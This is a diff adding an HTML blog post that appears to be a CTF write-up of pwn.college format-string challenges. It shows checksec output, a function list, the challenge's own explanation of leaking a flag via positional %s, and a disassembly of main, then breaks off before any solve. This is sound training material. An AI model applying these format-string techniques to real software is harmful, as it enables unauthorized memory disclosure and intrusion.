@@ -1,0 +1,529 @@
+<!doctype html>
+<html lang="en" data-scheme="river" data-schemes="river">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwn.college: Format String Exploits · river</title>
+    <meta name="description" content="hihi byebye">
+    <meta name="author" content="river">
+    <link rel="canonical" href="https://rivers.sh/posts/pwncollege-formatstring/">
+    <meta property="og:site_name" content="river">
+    <meta property="og:title" content="pwn.college: Format String Exploits">
+    <meta property="og:description" content="hihi byebye">
+    <meta property="og:url" content="https://rivers.sh/posts/pwncollege-formatstring/">
+    <meta property="og:type" content="article">
+    <meta property="og:image" content="https://rivers.sh/images/og.jpg">
+    <meta name="twitter:card" content="summary">
+    <link rel="icon" href="/images/favicon.svg" type="image/svg+xml">
+    <link rel="alternate" type="application/atom+xml" title="river" href="/atom.xml">
+    <link rel="preload" href="/fonts/MesloLGS-Regular.ttf" as="font" type="font/ttf" crossorigin>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/syntax.css">
+    <script>
+    // Runs before first paint: restore the visitor's colour scheme and pick the
+    // background art, so neither flashes in after load.
+    (function () {
+      var d = document.documentElement;
+      try {
+        var s = localStorage.getItem("scheme");
+        if (s && d.getAttribute("data-schemes").split(" ").indexOf(s) !== -1) d.setAttribute("data-scheme", s);
+      } catch (e) {}
+      var art = ["/images/art/art1.jpg"];
+      if (!art.length) return;
+      var i = Math.floor(Math.random() * art.length);
+      try {
+        // don't show the same art twice in a row
+        var last = parseInt(localStorage.getItem("art-last"), 10);
+        if (art.length > 1 && i === last) i = (i + 1 + Math.floor(Math.random() * (art.length - 1))) % art.length;
+        localStorage.setItem("art-last", i);
+      } catch (e) {}
+      var a = typeof art[i] === "string" ? { src: art[i] } : art[i];
+      d.style.setProperty("--art", 'url("' + a.src + '")');
+      d.style.setProperty("--art-pos", a.position || "right bottom");
+      d.setAttribute("data-art", "");
+    })();
+    </script>
+</head>
+<body class="is-post">
+    <a class="skip-link" href="#main">skip to content</a>
+    <div class="page">
+        <header class="site-header">
+    <a class="site-title" href="/">river</a>
+    <nav class="site-nav" aria-label="site">
+        <ul><li><a href="/">home</a></li><li><a href="/blog/">blog</a></li><li><a href="/categories/">categories</a></li><li><a href="/tags/">tags</a></li><li><a href="/search/">search</a></li></ul>
+    </nav>
+</header>
+
+        <main id="main">
+<article class="post h-entry">
+    <header class="post-header">
+        <h1 class="post-title p-name">pwn.college: Format String Exploits</h1>
+        <!-- no whitespace between items: the "|" separators supply the spacing -->
+        <div class="post-meta"><time class="dt-published" datetime="2026-09-25">Sep 25, 2026</time><span>11 min read</span><span class="post-cats"><a href="/categories/ctf/">CTF</a> › <a href="/categories/ctf/pwn-college/">pwn.college</a> › <a href="/categories/ctf/pwn-college/medium/">Medium</a></span><span class="post-tags"><a class="p-category" href="/tags/format-string/">#Format String</a> <a class="p-category" href="/tags/binary-exploitation/">#Binary Exploitation</a> <a class="p-category" href="/tags/pwn-college/">#pwn.college</a></span></div>
+        <p class="post-description p-summary">hihi byebye</p>
+    </header>
+
+    
+    <details class="toc toc-inline">
+        <summary>contents</summary>
+        <nav aria-label="contents"><ol><li class="toc-h2"><a href="#level-30">level 3.0</a></li><li class="toc-h3"><a href="#checksec-functions-running-binary">checksec, functions, running binary</a></li><li class="toc-h3"><a href="#disass-main">disass main</a></li><li class="toc-h3"><a href="#diass-func">diass func</a></li><li class="toc-h3"><a href="#solve">solve</a></li><li class="toc-h2"><a href="#level-31">level 3.1</a></li><li class="toc-h3"><a href="#challenge-info">challenge info</a></li><li class="toc-h3"><a href="#static-analysis-via-ida-pro">static analysis via ida pro</a></li><li class="toc-h3"><a href="#solve-1">solve</a></li><li class="toc-h2"><a href="#level-40">level 4.0</a></li><li class="toc-h3"><a href="#finding-correct-padding--slot">finding correct padding + slot</a></li><li class="toc-h3"><a href="#n-gimmick">%n gimmick</a></li><li class="toc-h3"><a href="#solve-2">solve</a></li><li class="toc-h2"><a href="#level-41">level 4.1</a></li><li class="toc-h3"><a href="#check_win">check_win</a></li><li class="toc-h3"><a href="#finding-clean-slot">finding clean slot</a></li><li class="toc-h3"><a href="#solve-3">solve</a></li></ol></nav>
+    </details>
+    
+
+    <div class="prose e-content" tabindex="-1">
+
+<h2 id="level-30"><a href="#level-30" class="anchor">#</a>level 3.0</h2>
+<h3 id="checksec-functions-running-binary"><a href="#checksec-functions-running-binary" class="anchor">#</a>checksec, functions, running binary</h3>
+<div class="sourceCode" id="cb1"><pre class="sourceCode nasm"><code class="sourceCode nasm"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>pwndbg<span class="op">&gt;</span> checksec</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="fu">File:</span>     /home<span class="op">/</span>river<span class="op">/</span>ctf<span class="op">/</span>pwncollege<span class="op">/</span>formatstring3<span class="op">/</span>babyfmt_level3<span class="op">.</span>0</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="fu">Arch:</span>     amd64</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="fu">RELRO:</span>      Partial RELRO</span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="fu">Stack:</span>      Canary found</span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="fu">NX:</span>         NX enabled</span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="fu">PIE:</span>        No PIE <span class="op">(</span><span class="bn">0x400000</span><span class="op">)</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="fu">SHSTK:</span>      Enabled</span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="fu">IBT:</span>        Enabled</span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="fu">Stripped:</span>   No</span></code></pre></div>
+<div class="sourceCode" id="cb2"><pre class="sourceCode nasm"><code class="sourceCode nasm"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a>pwndbg<span class="op">&gt;</span> info functions</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>All defined functions<span class="op">:</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>Non<span class="op">-</span>debugging symbols<span class="op">:</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>0x0000000000401000  _init</span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>0x00000000004010e0  putchar@plt</span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>0x00000000004010f0  puts@plt</span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>0x0000000000401100  __stack_chk_fail@plt</span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>0x0000000000401110  setbuf@plt</span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>0x0000000000401120  printf@plt</span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>0x0000000000401130  __assert_fail@plt</span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a>0x0000000000401140  read@plt</span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a>0x0000000000401150  srand@plt</span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>0x0000000000401160  time@plt</span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a>0x0000000000401170  setvbuf@plt</span>
+<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a>0x0000000000401180  open@plt</span>
+<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a>0x0000000000401190  _start</span>
+<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a>0x00000000004011c0  _dl_relocate_static_pie</span>
+<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a>0x00000000004011d0  deregister_tm_clones</span>
+<span id="cb2-20"><a href="#cb2-20" aria-hidden="true" tabindex="-1"></a>0x0000000000401200  register_tm_clones</span>
+<span id="cb2-21"><a href="#cb2-21" aria-hidden="true" tabindex="-1"></a>0x0000000000401240  __do_global_dtors_aux</span>
+<span id="cb2-22"><a href="#cb2-22" aria-hidden="true" tabindex="-1"></a>0x0000000000401270  frame_dummy</span>
+<span id="cb2-23"><a href="#cb2-23" aria-hidden="true" tabindex="-1"></a>0x0000000000401276  DUMP_STACK</span>
+<span id="cb2-24"><a href="#cb2-24" aria-hidden="true" tabindex="-1"></a>0x0000000000401479  init</span>
+<span id="cb2-25"><a href="#cb2-25" aria-hidden="true" tabindex="-1"></a>0x00000000004014c0  func</span>
+<span id="cb2-26"><a href="#cb2-26" aria-hidden="true" tabindex="-1"></a>0x000000000040170f  main</span>
+<span id="cb2-27"><a href="#cb2-27" aria-hidden="true" tabindex="-1"></a>0x0000000000401830  __libc_csu_init</span>
+<span id="cb2-28"><a href="#cb2-28" aria-hidden="true" tabindex="-1"></a>0x00000000004018a0  __libc_csu_fini</span>
+<span id="cb2-29"><a href="#cb2-29" aria-hidden="true" tabindex="-1"></a>0x00000000004018a8  _fini</span></code></pre></div>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ./babyfmt_level3.0</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="co">###</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="co">### Welcome to ./babyfmt_level3.0!</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="co">###</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="ex">This</span> challenge reads in some bytes, calls printf on that string, and allows you to perform</span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a><span class="ex">a</span> format string attack. Through this series of challenges, you will become painfully familiar</span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a><span class="ex">with</span> the concept of Format String Attacks!</span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a><span class="ex">This</span> challenge allows you to make a 256-sized format string.</span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a><span class="ex">This</span> challenge reads the flag into the .bss! Nice and easy<span class="kw">;</span> <span class="ex">just</span> read it out!</span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a><span class="ex">So,</span> the flag is in the .bss. How are you going to get it<span class="pp">?</span></span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a><span class="ex">One</span> way to do it is to use %s in your format string. It will dereference a pointer</span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a><span class="ex">and</span> print the string that the pointer is pointing to. This is perfect for leaking the</span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a><span class="ex">flag</span> from the BSS!</span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a><span class="ex">But</span> there<span class="st">&#39;s one problem... Unlike level 1, you don&#39;</span>t have a pointer to the bss on the stack.</span>
+<span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a><span class="ex">The</span> solution<span class="pp">?</span> Write this address in as part of your format string, then use a positional %s <span class="er">(</span><span class="ex">i.e.,</span></span>
+<span id="cb3-21"><a href="#cb3-21" aria-hidden="true" tabindex="-1"></a><span class="ex">%X</span><span class="va">$s</span> with the correct X<span class="kw">)</span> <span class="ex">to</span> use that address as the pointer. That way, you have full control of</span>
+<span id="cb3-22"><a href="#cb3-22" aria-hidden="true" tabindex="-1"></a><span class="ex">the</span> address!</span>
+<span id="cb3-23"><a href="#cb3-23" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-24"><a href="#cb3-24" aria-hidden="true" tabindex="-1"></a><span class="ex">In</span> this case, the address you want is 0x404140. Remember to input it in little endian! To debug what</span>
+<span id="cb3-25"><a href="#cb3-25" aria-hidden="true" tabindex="-1"></a><span class="ex">address</span> your %s will dereference, you can replace <span class="st">&#39;s&#39;</span> with <span class="st">&#39;x&#39;</span> and see what the address is</span>
+<span id="cb3-26"><a href="#cb3-26" aria-hidden="true" tabindex="-1"></a><span class="ex">being</span> interpreted at.</span>
+<span id="cb3-27"><a href="#cb3-27" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-28"><a href="#cb3-28" aria-hidden="true" tabindex="-1"></a><span class="ex">I</span> will now read up to 256 bytes. Send your data!</span></code></pre></div>
+<h3 id="disass-main"><a href="#disass-main" class="anchor">#</a>disass main</h3>
+<div class="sourceCode" id="cb4"><pre class="sourceCode nasm"><code class="sourceCode nasm"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>Dump of assembler code for function main<span class="op">:</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>   0x000000000040170f &lt;+0&gt;:	<span class="kw">endbr64</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>   0x0000000000401713 &lt;+4&gt;:	<span class="kw">push</span>   <span class="kw">rbp</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>   0x0000000000401714 &lt;+5&gt;:	<span class="kw">mov</span>    <span class="kw">rbp</span><span class="op">,</span><span class="kw">rsp</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>   0x0000000000401717 &lt;+8&gt;:	<span class="kw">sub</span>    <span class="kw">rsp</span><span class="op">,</span><span class="bn">0x20</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>   0x000000000040171b &lt;+12&gt;:	<span class="kw">mov</span>    <span class="dt">DWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x4</span><span class="op">],</span><span class="kw">edi</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>   0x000000000040171e &lt;+15&gt;:	<span class="kw">mov</span>    <span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x10</span><span class="op">],</span><span class="kw">rsi</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>   0x0000000000401722 &lt;+19&gt;:	<span class="kw">mov</span>    <span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x18</span><span class="op">],</span><span class="kw">rdx</span></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>   0x0000000000401726 &lt;+23&gt;:	<span class="kw">mov</span>    <span class="kw">rax</span><span class="op">,</span><span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0x2963</span><span class="op">]</span>        # <span class="bn">0x404090</span> <span class="op">&lt;</span>stdin@@GLIBC_2<span class="op">.</span>2<span class="op">.</span>5<span class="op">&gt;</span></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>   0x000000000040172d &lt;+30&gt;:	<span class="kw">mov</span>    <span class="kw">ecx</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>   0x0000000000401732 &lt;+35&gt;:	<span class="kw">mov</span>    <span class="kw">edx</span><span class="op">,</span><span class="bn">0x2</span></span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>   0x0000000000401737 &lt;+40&gt;:	<span class="kw">mov</span>    <span class="kw">esi</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>   0x000000000040173c &lt;+45&gt;:	<span class="kw">mov</span>    <span class="kw">rdi</span><span class="op">,</span><span class="kw">rax</span></span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>   0x000000000040173f &lt;+48&gt;:	<span class="cf">call</span>   <span class="bn">0x401170</span> <span class="op">&lt;</span>setvbuf@plt<span class="op">&gt;</span></span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>   0x0000000000401744 &lt;+53&gt;:	<span class="kw">mov</span>    <span class="kw">rax</span><span class="op">,</span><span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0x2935</span><span class="op">]</span>        # <span class="bn">0x404080</span> <span class="op">&lt;</span>stdout@@GLIBC_2<span class="op">.</span>2<span class="op">.</span>5<span class="op">&gt;</span></span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>   0x000000000040174b &lt;+60&gt;:	<span class="kw">mov</span>    <span class="kw">ecx</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a>   0x0000000000401750 &lt;+65&gt;:	<span class="kw">mov</span>    <span class="kw">edx</span><span class="op">,</span><span class="bn">0x2</span></span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a>   0x0000000000401755 &lt;+70&gt;:	<span class="kw">mov</span>    <span class="kw">esi</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>   0x000000000040175a &lt;+75&gt;:	<span class="kw">mov</span>    <span class="kw">rdi</span><span class="op">,</span><span class="kw">rax</span></span>
+<span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a>   0x000000000040175d &lt;+78&gt;:	<span class="cf">call</span>   <span class="bn">0x401170</span> <span class="op">&lt;</span>setvbuf@plt<span class="op">&gt;</span></span>
+<span id="cb4-21"><a href="#cb4-21" aria-hidden="true" tabindex="-1"></a>   0x0000000000401762 &lt;+83&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xd65</span><span class="op">]</span>        # <span class="bn">0x4024ce</span></span>
+<span id="cb4-22"><a href="#cb4-22" aria-hidden="true" tabindex="-1"></a>   0x0000000000401769 &lt;+90&gt;:	<span class="cf">call</span>   <span class="bn">0x4010f0</span> <span class="op">&lt;</span>puts@plt<span class="op">&gt;</span></span>
+<span id="cb4-23"><a href="#cb4-23" aria-hidden="true" tabindex="-1"></a>   0x000000000040176e &lt;+95&gt;:	<span class="kw">mov</span>    <span class="kw">rax</span><span class="op">,</span><span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x10</span><span class="op">]</span></span>
+<span id="cb4-24"><a href="#cb4-24" aria-hidden="true" tabindex="-1"></a>   0x0000000000401772 &lt;+99&gt;:	<span class="kw">mov</span>    <span class="kw">rax</span><span class="op">,</span><span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rax</span><span class="op">]</span></span>
+<span id="cb4-25"><a href="#cb4-25" aria-hidden="true" tabindex="-1"></a>   0x0000000000401775 &lt;+102&gt;:	<span class="kw">mov</span>    <span class="kw">rsi</span><span class="op">,</span><span class="kw">rax</span></span>
+<span id="cb4-26"><a href="#cb4-26" aria-hidden="true" tabindex="-1"></a>   0x0000000000401778 &lt;+105&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xd53</span><span class="op">]</span>        # <span class="bn">0x4024d2</span></span>
+<span id="cb4-27"><a href="#cb4-27" aria-hidden="true" tabindex="-1"></a>   0x000000000040177f &lt;+112&gt;:	<span class="kw">mov</span>    <span class="kw">eax</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb4-28"><a href="#cb4-28" aria-hidden="true" tabindex="-1"></a>   0x0000000000401784 &lt;+117&gt;:	<span class="cf">call</span>   <span class="bn">0x401120</span> <span class="op">&lt;</span>printf@plt<span class="op">&gt;</span></span>
+<span id="cb4-29"><a href="#cb4-29" aria-hidden="true" tabindex="-1"></a>   0x0000000000401789 &lt;+122&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xd3e</span><span class="op">]</span>        # <span class="bn">0x4024ce</span></span>
+<span id="cb4-30"><a href="#cb4-30" aria-hidden="true" tabindex="-1"></a>   0x0000000000401790 &lt;+129&gt;:	<span class="cf">call</span>   <span class="bn">0x4010f0</span> <span class="op">&lt;</span>puts@plt<span class="op">&gt;</span></span>
+<span id="cb4-31"><a href="#cb4-31" aria-hidden="true" tabindex="-1"></a>   0x0000000000401795 &lt;+134&gt;:	<span class="kw">mov</span>    <span class="kw">edi</span><span class="op">,</span><span class="bn">0xa</span></span>
+<span id="cb4-32"><a href="#cb4-32" aria-hidden="true" tabindex="-1"></a>   0x000000000040179a &lt;+139&gt;:	<span class="cf">call</span>   <span class="bn">0x4010e0</span> <span class="op">&lt;</span>putchar@plt<span class="op">&gt;</span></span>
+<span id="cb4-33"><a href="#cb4-33" aria-hidden="true" tabindex="-1"></a>   0x000000000040179f &lt;+144&gt;:	<span class="kw">cmp</span>    <span class="dt">DWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x4</span><span class="op">],</span><span class="bn">0x0</span></span>
+<span id="cb4-34"><a href="#cb4-34" aria-hidden="true" tabindex="-1"></a>   0x00000000004017a3 &lt;+148&gt;:	<span class="cf">jg</span>     <span class="bn">0x4017c4</span> <span class="op">&lt;</span>main<span class="op">+</span><span class="dv">181</span><span class="op">&gt;</span></span>
+<span id="cb4-35"><a href="#cb4-35" aria-hidden="true" tabindex="-1"></a>   0x00000000004017a5 &lt;+150&gt;:	<span class="kw">lea</span>    <span class="kw">rcx</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xe86</span><span class="op">]</span>        # <span class="bn">0x402632</span> <span class="op">&lt;</span>__PRETTY_FUNCTION__<span class="op">.</span>5740<span class="op">&gt;</span></span>
+<span id="cb4-36"><a href="#cb4-36" aria-hidden="true" tabindex="-1"></a>   0x00000000004017ac &lt;+157&gt;:	<span class="kw">mov</span>    <span class="kw">edx</span><span class="op">,</span><span class="bn">0x9e</span></span>
+<span id="cb4-37"><a href="#cb4-37" aria-hidden="true" tabindex="-1"></a>   0x00000000004017b1 &lt;+162&gt;:	<span class="kw">lea</span>    <span class="kw">rsi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xd2e</span><span class="op">]</span>        # <span class="bn">0x4024e6</span></span>
+<span id="cb4-38"><a href="#cb4-38" aria-hidden="true" tabindex="-1"></a>   0x00000000004017b8 &lt;+169&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xd2f</span><span class="op">]</span>        # <span class="bn">0x4024ee</span></span>
+<span id="cb4-39"><a href="#cb4-39" aria-hidden="true" tabindex="-1"></a>   0x00000000004017bf &lt;+176&gt;:	<span class="cf">call</span>   <span class="bn">0x401130</span> <span class="op">&lt;</span>__assert_fail@plt<span class="op">&gt;</span></span>
+<span id="cb4-40"><a href="#cb4-40" aria-hidden="true" tabindex="-1"></a>   0x00000000004017c4 &lt;+181&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xd2d</span><span class="op">]</span>        # <span class="bn">0x4024f8</span></span>
+<span id="cb4-41"><a href="#cb4-41" aria-hidden="true" tabindex="-1"></a>   0x00000000004017cb &lt;+188&gt;:	<span class="cf">call</span>   <span class="bn">0x4010f0</span> <span class="op">&lt;</span>puts@plt<span class="op">&gt;</span></span>
+<span id="cb4-42"><a href="#cb4-42" aria-hidden="true" tabindex="-1"></a>   0x00000000004017d0 &lt;+193&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xd81</span><span class="op">]</span>        # <span class="bn">0x402558</span></span>
+<span id="cb4-43"><a href="#cb4-43" aria-hidden="true" tabindex="-1"></a>   0x00000000004017d7 &lt;+200&gt;:	<span class="cf">call</span>   <span class="bn">0x4010f0</span> <span class="op">&lt;</span>puts@plt<span class="op">&gt;</span></span>
+<span id="cb4-44"><a href="#cb4-44" aria-hidden="true" tabindex="-1"></a>   0x00000000004017dc &lt;+205&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xdd5</span><span class="op">]</span>        # <span class="bn">0x4025b8</span></span>
+<span id="cb4-45"><a href="#cb4-45" aria-hidden="true" tabindex="-1"></a>   0x00000000004017e3 &lt;+212&gt;:	<span class="cf">call</span>   <span class="bn">0x4010f0</span> <span class="op">&lt;</span>puts@plt<span class="op">&gt;</span></span>
+<span id="cb4-46"><a href="#cb4-46" aria-hidden="true" tabindex="-1"></a>   0x00000000004017e8 &lt;+217&gt;:	<span class="kw">mov</span>    <span class="kw">edi</span><span class="op">,</span><span class="bn">0xa</span></span>
+<span id="cb4-47"><a href="#cb4-47" aria-hidden="true" tabindex="-1"></a>   0x00000000004017ed &lt;+222&gt;:	<span class="cf">call</span>   <span class="bn">0x4010e0</span> <span class="op">&lt;</span>putchar@plt<span class="op">&gt;</span></span>
+<span id="cb4-48"><a href="#cb4-48" aria-hidden="true" tabindex="-1"></a>   0x00000000004017f2 &lt;+227&gt;:	<span class="kw">mov</span>    <span class="kw">esi</span><span class="op">,</span><span class="bn">0x100</span></span>
+<span id="cb4-49"><a href="#cb4-49" aria-hidden="true" tabindex="-1"></a>   0x00000000004017f7 &lt;+232&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xdea</span><span class="op">]</span>        # <span class="bn">0x4025e8</span></span>
+<span id="cb4-50"><a href="#cb4-50" aria-hidden="true" tabindex="-1"></a>   0x00000000004017fe &lt;+239&gt;:	<span class="kw">mov</span>    <span class="kw">eax</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb4-51"><a href="#cb4-51" aria-hidden="true" tabindex="-1"></a>   0x0000000000401803 &lt;+244&gt;:	<span class="cf">call</span>   <span class="bn">0x401120</span> <span class="op">&lt;</span>printf@plt<span class="op">&gt;</span></span>
+<span id="cb4-52"><a href="#cb4-52" aria-hidden="true" tabindex="-1"></a>   0x0000000000401808 &lt;+249&gt;:	<span class="kw">mov</span>    <span class="kw">edi</span><span class="op">,</span><span class="bn">0xa</span></span>
+<span id="cb4-53"><a href="#cb4-53" aria-hidden="true" tabindex="-1"></a>   0x000000000040180d &lt;+254&gt;:	<span class="cf">call</span>   <span class="bn">0x4010e0</span> <span class="op">&lt;</span>putchar@plt<span class="op">&gt;</span></span>
+<span id="cb4-54"><a href="#cb4-54" aria-hidden="true" tabindex="-1"></a>   0x0000000000401812 &lt;+259&gt;:	<span class="cf">call</span>   <span class="bn">0x4014c0</span> <span class="op">&lt;</span>func<span class="op">&gt;</span></span>
+<span id="cb4-55"><a href="#cb4-55" aria-hidden="true" tabindex="-1"></a>   0x0000000000401817 &lt;+264&gt;:	<span class="kw">lea</span>    <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rip</span><span class="op">+</span><span class="bn">0xe07</span><span class="op">]</span>        # <span class="bn">0x402625</span></span>
+<span id="cb4-56"><a href="#cb4-56" aria-hidden="true" tabindex="-1"></a>   0x000000000040181e &lt;+271&gt;:	<span class="cf">call</span>   <span class="bn">0x4010f0</span> <span class="op">&lt;</span>puts@plt<span class="op">&gt;</span></span>
+<span id="cb4-57"><a href="#cb4-57" aria-hidden="true" tabindex="-1"></a>   0x0000000000401823 &lt;+276&gt;:	<span class="kw">mov</span>    <span class="kw">eax</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb4-58"><a href="#cb4-58" aria-hidden="true" tabindex="-1"></a>   0x0000000000401828 &lt;+281&gt;:	<span class="kw">leave</span></span>
+<span id="cb4-59"><a href="#cb4-59" aria-hidden="true" tabindex="-1"></a>   0x0000000000401829 &lt;+282&gt;:	<span class="cf">ret</span></span>
